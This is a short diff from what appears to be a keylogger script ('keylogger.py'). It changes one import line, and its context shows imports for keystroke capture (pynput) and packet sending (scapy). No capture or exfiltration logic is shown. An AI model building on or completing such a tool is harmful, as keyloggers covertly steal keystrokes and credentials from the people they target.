@@ -3,7 +3,7 @@ from scapy.all import TCP, IP, send
 from sys import exit
 from pynput.keyboard import Key, Listener
 import argparse
-from ipaddress import ip_address, IPv4Address, IPv6Address
+from ipaddress import ip_address, IPv6Address
 
 # Command Line Arguments
 parser = argparse.ArgumentParser("./keylogger.py")
